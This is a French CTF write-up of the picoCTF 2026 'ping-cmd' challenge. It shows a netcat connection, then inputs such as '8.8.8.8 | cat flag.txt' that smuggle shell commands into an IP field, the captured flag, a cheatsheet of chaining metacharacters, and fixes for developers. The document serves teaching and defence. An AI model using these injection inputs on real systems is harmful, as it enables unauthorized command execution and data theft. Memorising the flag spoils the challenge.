---
title: "ping-cmd"
---

# 🧰 ping-cmd

Exploitation d'injection de commande système (OS Command Injection)

**Plateforme :** picoCTF 2026 · **Catégorie :** General Skills / Web · **Difficulté :** *Easy*{: .badge-easy} · **Auteur :** Yahaya Meddy
{: .ctf-meta}

!!! success "Flag"
    `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_8555bda7}`

## Objectif & résumé de la vulnérabilité

L'objectif de ce challenge est de contourner la logique d'une application distante effectuant la commande système `ping` afin d'obtenir un accès en lecture sur le fichier restreint `flag.txt`.

L'application souffre d'une vulnérabilité d'**injection de commande système (OS Command Injection)** : elle prend la saisie utilisateur (censée être une IP) et l'exécute directement dans le shell sans assainissement ni validation stricte.

!!! danger "Concept clé : command injection & métacaractères shell"
    Une Command Injection survient lorsqu'une application transmet des données non vérifiées à un interpréteur de commandes (ex : Bash). L'injection d'opérateurs comme le tube `|`, le point-virgule `;` ou l'opérateur `&&` permet de chaîner plusieurs commandes et d'exécuter des instructions arbitraires avec les privilèges du processus serveur.

## Outils & concepts clés

| Outil / Concept | Rôle & utilisation dans le CTF |
| :--- | :--- |
| `netcat` (`nc`) | Ouvrir des connexions brutes en TCP avec le serveur distant |
| Opérateur pipeline (`\|`) | Transmet la sortie d'une commande à l'entrée d'une autre, forçant l'exécution en chaîne |
| `ls` & `cat` | Énumérer le dossier courant et afficher le contenu du flag |
| Absence de sanitization | Faille consistant à faire confiance à la saisie client au lieu d'imposer une liste blanche |

## Démarche pas à pas

### Étape 1 — Connexion réseau & analyse de l'application

```bash
nc mysterious-sea.picoctf.net 49294
```

L'application affiche : `Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):`

### Étape 2 — Validation de l'injection (énumération avec ls)

En s'appuyant sur l'indice n°2 (« Sometimes, You can run more than one command at a time »), l'objectif est d'injecter une commande de reconnaissance après l'adresse IP attendue, avec le caractère pipe `|` :

```text
8.8.8.8 | ls
```

Résultat retourné par le serveur :
```text
flag.txt
script.sh
```

### Étape 3 — Exploitation finale & obtention du flag

```text
8.8.8.8 | cat flag.txt
```

Sortie obtenue : `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_8555bda7}`

## Mémento technique (cheatsheet OS injection)

| Métacaractère | Comportement / description |
| :--- | :--- |
| `\|` (pipeline) | Redirige la sortie de la commande de gauche vers la commande de droite (exécute toujours la suite) |
| `;` (séquence) | Exécute la seconde commande de manière séquentielle, indépendamment du succès de la première |
| `&&` (ET logique) | Exécute la seconde commande uniquement si la première a réussi (code retour 0) |
| `\|\|` (OU logique) | Exécute la seconde commande uniquement si la première a échoué |
| `$(...)` / `` `...` `` | Substitution de commande : exécute l'instruction imbriquée et insère son résultat |

## ✅ Leçons retenues & réflexes à garder

- **Jamais de confiance envers l'input utilisateur :** ne jamais concaténer directement une entrée utilisateur dans une commande système (ex: `system("ping " + user_input)`).
- **Préférer le whitelisting & API sécurisées :** valider la donnée via des expressions régulières strictes et utiliser des fonctions exécutant les arguments sous forme de tableau (ex: `subprocess.run(["ping", "-c", "1", ip_address])` en Python).
- **Réflexe de test en CTF :** lorsqu'un champ texte accepte des paramètres réseau, tester systématiquement les métacaractères `|`, `;`, `&`, et `` ` ``.
